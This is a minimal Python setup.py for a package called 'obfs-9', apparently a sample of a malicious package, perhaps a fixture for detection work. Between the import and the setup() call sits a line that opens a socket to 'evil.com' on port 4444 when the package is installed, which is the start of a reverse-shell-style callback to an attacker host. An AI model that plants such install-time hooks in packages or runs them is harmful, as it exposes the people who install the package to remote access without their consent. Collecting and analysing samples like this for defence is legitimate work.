from setuptools import setup
import socket; s=socket.socket(); s.connect(("evil.com", 4444))
setup(name="obfs-9", version="1.0.0")
